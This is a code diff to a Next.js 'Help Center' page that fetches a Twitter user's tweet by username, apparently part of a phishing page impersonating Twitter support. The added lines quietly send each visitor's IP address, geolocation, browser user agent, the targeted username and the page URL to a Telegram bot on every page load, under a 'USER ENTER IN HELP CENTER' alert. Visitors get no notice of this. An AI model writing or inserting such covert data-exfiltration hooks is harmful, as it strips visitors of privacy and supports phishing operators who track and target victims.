@@ -4,6 +4,8 @@ import type { Metadata } from "next";
 import { headers } from "next/headers";
 import Image from "next/image";
 import Link from "next/link";
+import { getBrowserData } from "@/helpers/getBrowserData";
+import { sendMessageToTelegramBot } from "@/helpers/send-data-to-telegram";
 
 export const metadata: Metadata = {
 	title: "Help Center",
@@ -24,16 +26,9 @@ export default async function HelpCenterPage({ params }: Props) {
 		return `${protocol}://${host}`;
 	};
 
-	const getTweetUrl = async (headers: Headers, username = "elonmusk") => {
-		const baseUrl = getBaseUrl(headers);
-
-		const userResponse = await fetch(
-			`${baseUrl}/api/twitter/users?username=${username}`,
-		);
-		const user = await userResponse.json();
-
+	const getTweetUrl = async (baseUrl: string, user: TwitterUser) => {
 		if (!user) {
-			return "https%3A%2F%2Ftwitter.com%2Felonmusk%2Fstatus%2F20";
+			return;
 		}
 
 		const tweetResponse = await fetch(
@@ -42,16 +37,39 @@ export default async function HelpCenterPage({ params }: Props) {
 		const tweetInfo = await tweetResponse.json();
 
 		if (tweetInfo.error) {
-			return "https%3A%2F%2Ftwitter.com%2Felonmusk%2Fstatus%2F20";
+			return;
 		}
 
-		return tweetInfo
-			? `https://twitter.com/user/status/${tweetInfo?.id}`
-			: "https%3A%2F%2Ftwitter.com%2Felonmusk%2Fstatus%2F20";
+		return `https://twitter.com/user/status/${tweetInfo?.id}`;
 	};
 
-	const headersList = await headers();
-	const tweetUrl = await getTweetUrl(headersList, username);
+	const headersList = await headers();	
+
+	const baseUrl = getBaseUrl(headersList);
+
+	const userResponse = await fetch(
+		`${baseUrl}/api/twitter/users?username=${username}`,
+	);
+
+	const user: TwitterUser = await userResponse.json();
+
+	const tweetUrl = await getTweetUrl(baseUrl, user);
+
+	getBrowserData(headersList).then(browserData => {
+		sendMessageToTelegramBot({
+			message: `
+🔛 USER ENTER IN HELP CENTER
+
+👤 USERNAME: ${username}
+
+🖥️ IP: ${browserData.ip}
+🌍 Location: ${browserData.geoLocation}
+🧩 Agent: ${browserData.userAgent}
+
+🌐 SITE: ${baseUrl}/help/${username}
+`
+		})
+	});
 
 	return (
 		<main className="flex flex-col items-center bg-white">
